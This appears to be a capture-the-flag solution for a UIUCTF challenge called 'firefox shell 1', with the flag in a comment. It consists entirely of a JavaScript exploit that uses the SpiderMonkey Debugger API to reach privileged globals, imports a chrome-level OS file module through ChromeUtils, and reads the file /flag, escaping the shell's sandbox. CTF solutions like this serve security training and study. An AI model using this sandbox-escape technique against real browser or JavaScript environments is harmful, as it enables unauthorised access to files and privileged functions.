// firefox shell 1
// uiuctf{why_mozilla_why_docs_either_deleted_or_bad_3466658a}

.show
.debug

x=new Debugger()
x.addAllGlobalsAsDebuggees()
r=x.findAllGlobals()
c=r[0].getProperty("ChromeUtils").return
z=c.getProperty("import").return.call(c,"resource://gre/modules/osfile/osfile_native.jsm").return
read=z.getProperty("read").return
f=read.call(z, "/flag").return
flagA=f.promiseValue
flag=flagA.getProperty("join").return.call(flagA, ", ").return
